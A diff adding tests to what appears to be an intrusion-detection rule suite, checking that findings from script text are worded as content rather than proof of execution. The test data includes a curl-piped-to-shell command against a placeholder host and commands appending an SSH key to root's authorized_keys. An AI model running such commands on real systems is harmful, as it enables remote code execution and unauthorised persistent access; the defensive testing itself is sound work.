@@ -432,3 +432,19 @@ def test_browser_ua_mentioning_curl_is_not_tool():
     m = run(network.ToolUserAgentHttp, [ev(family="http_tx", source__ip="192.0.2.10", destination__ip="192.0.2.99",
                                            user_agent__original="Mozilla/5.0 (compatible; curlbot-lookalike)")])
     assert m == []
+
+
+# ---------------------------------------------------------------- option 2: script text is an indicator, not proof
+def test_script_text_findings_are_worded_as_content_not_execution():
+    m = run(host.DownloadPipedToShell, [exec_ev(["/bin/sh", "-c", "curl http://192.0.2.7/TODO.md | sh"])])
+    assert len(m) == 1 and m[0].claim_type == "script_content"
+    assert "script that contains the pipeline" in m[0].claim and "not established" in m[0].claim
+    assert "running the pipeline" not in m[0].claim
+
+
+def test_authorized_keys_direct_exec_vs_script_text_claims():
+    direct = run(host.AuthorizedKeysWrite, [exec_ev(["tee", "-a", "/root/.ssh/authorized_keys"])])
+    script = run(host.AuthorizedKeysWrite,
+                 [exec_ev(["/bin/sh", "-c", "echo ssh-ed25519 AAAA x >> /root/.ssh/authorized_keys"])])
+    assert direct[0].claim_type == "observed_action" and "records a command that writes" in direct[0].claim
+    assert script[0].claim_type == "script_content" and "script that contains a write" in script[0].claim
